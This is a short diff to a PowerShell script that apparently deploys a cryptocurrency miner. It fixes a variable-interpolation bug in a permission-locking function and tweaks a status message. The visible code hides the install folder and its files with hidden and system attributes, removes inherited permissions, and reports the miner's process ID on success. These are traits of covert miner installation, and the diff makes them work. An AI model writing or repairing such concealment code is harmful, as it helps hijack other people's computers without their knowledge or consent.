@@ -437,7 +437,7 @@ function Lock-InstallDirectory {
     & icacls $installDir /inheritance:r /T /Q 2>$null
     & icacls $installDir /grant:r "*S-1-5-18:(OI)(CI)F" /T /Q 2>$null
     $userSid = (New-Object System.Security.Principal.NTAccount($env:USERNAME)).Translate([System.Security.Principal.SecurityIdentifier]).Value
-    & icacls $installDir /grant:r "*$userSid:(OI)(CI)F" /T /Q 2>$null
+    & icacls $installDir /grant:r "*$($userSid):(OI)(CI)F" /T /Q 2>$null
     & attrib +h +s $installDir /s /d 2>$null
     & attrib +h +s "$installDir\*" /s /d 2>$null
     Write-Host "[+] Directory locked" -ForegroundColor Green
@@ -523,7 +523,7 @@ try {
         $deploymentSuccess = $true
         Write-Host "`n[+] DEPLOYMENT SUCCESS" -ForegroundColor Green
         Write-Host "[+] Miner PID: $($minerProc.Id)" -ForegroundColor Green
-        Write-Host "[+] All 10 bugs fixed" -ForegroundColor Green
+        Write-Host '[+] All 10 bugs fixed' -ForegroundColor Green
     } else {
         $deploymentError = "Miner not running after start"
         Write-Host "`n[-] DEPLOYMENT FAILED: $deploymentError" -ForegroundColor Red
